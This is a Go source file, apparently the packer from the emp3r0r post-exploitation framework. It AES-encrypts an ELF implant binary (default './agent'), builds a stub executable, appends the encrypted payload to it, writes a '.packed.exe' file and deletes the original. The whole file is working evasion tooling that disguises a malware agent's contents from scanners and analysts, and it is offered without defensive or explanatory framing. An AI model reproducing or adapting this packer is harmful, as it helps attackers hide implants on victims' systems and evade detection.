package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"

	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
)

func main() {
	inputELF := flag.String("input", "./agent", "The ELF file to pack")
	flag.Parse()

	// read file
	elfBytes, err := ioutil.ReadFile(*inputELF)
	if err != nil {
		log.Fatal(err)
	}

	// encrypt
	key := utils.GenAESKey(utils.Key)
	encELFBytes := utils.AESEncrypt(key, elfBytes)
	if encELFBytes == nil {
		log.Fatalf("failed to encrypt %s", *inputELF)
	}

	// build stub
	err = os.Chdir("./cmd/stub")
	if err != nil {
		log.Fatal(err)
	}
	out, err := exec.Command("go", "build", "-ldflags=-s -w", "-o", "../../stub.exe").CombinedOutput()
	if err != nil {
		log.Fatalf("go build failed: %v\n%s", err, out)
	}
	err = os.Chdir("../../")
	if err != nil {
		log.Fatal(err)
	}

	// write
	toWrite, err := ioutil.ReadFile("stub.exe")
	if err != nil {
		log.Fatal(err)
	}
	toWrite = append(toWrite, []byte(utils.Sep)...)
	toWrite = append(toWrite, encELFBytes...)
	err = ioutil.WriteFile(fmt.Sprintf("%s.packed.exe", *inputELF), toWrite, 0600)
	if err != nil {
		log.Fatal(err)
	}

	// done
	os.Remove(*inputELF)
	log.Printf("%s has been packed as %s.packed.exe", *inputELF, *inputELF)
}
